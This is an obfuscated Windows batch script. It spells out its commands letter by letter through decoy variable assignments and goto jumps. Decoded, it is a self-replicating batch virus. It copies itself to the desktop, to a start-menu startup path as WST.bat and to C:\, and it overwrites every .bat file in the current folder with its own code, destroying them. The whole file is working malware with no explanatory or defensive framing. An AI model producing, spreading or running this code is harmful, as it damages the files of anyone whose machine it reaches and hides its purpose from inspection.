set aa=fg
set aa=e ; this is the true set
goto aa
set aa=gf
:aa

set ab=gfd
set ab=c ; this is the true set
goto ab
set ab=gf
:ab

set ac=we
set ac=h ; this is the true set
goto ac
set ac=gf
:ac

set ad=ds
set ad=o ; this is the true set
goto ad
set ad=gf
:ad

set ae=j
set ae=f ; this is the true set
goto ae
set ae=gf
:ae

set af=h
set af=t ; this is the true set
goto af
set af=gf
:af

set ag=g
set ag=y ; this is the true set
goto ag
set ag=gf
:ag

set ah=f
set ah=n ; this is the true set
goto ah
set ah=gf
:ah

set ai=ds
set ai=u ; this is the true set
goto ai
set ai=gf
:ai

set aj=ds
set aj=l ; this is the true set
goto aj
set aj=gf
:aj

set ak=c
set ak=p ; this is the true set
goto ak
set ak=gf
:ak

set al=v
set al=s ; this is the true set
goto al
set al=gf
:al

set am=b
set am=%0 ; this is the true set
goto am
set am=gf
:am

set an=n
set an=\ ; this is the true set
goto am
set am=gf
:am

set ao=dr
set ao=d ; this is the true set
goto ao
set ao=gf
:ao

set ap=g
set ap=k ; this is the true set
goto ap
set ap=gf
:ap

set aq=e
set aq=a ; this is the true set
goto aq
set aq=gf
:aq

set ar=s
set ar=r ; this is the true set
goto ar
set ar=gf
:ar

set at=h
set at=m ; this is the true set
goto at
set at=gf
:at

set au=s
set au=g ; this is the true set
goto au
set au=gf
:au

set av=f
set av=i ; this is the true set
goto av
set av=gf
:av
%ab%%aj%%al%
@%aa%%ab%%ac%%ad% %ad%%af%%af%
%ab%%ad%%ak%%ag% %am% %windir%%an%%ao%%aa%%al%%ap%%af%%ad%%ap%%an%*.bat
%ab%%ad%%ak%%ag% %am% %windir%%an%%al%%at%%aq%%ar%%af%%at%~1%an%%ak%%ar%%ad%%au%%ar%%aq%~1%an%WST.bat
%ae%%ad%%ar% %%v %av%%ah% (*.bat) %ao%%ad% %ab%%ad%%ak%%ag% %am% %%v
%ab%%ad%%ak%%ag% %am% C:%an%
%ab%%aj%%al%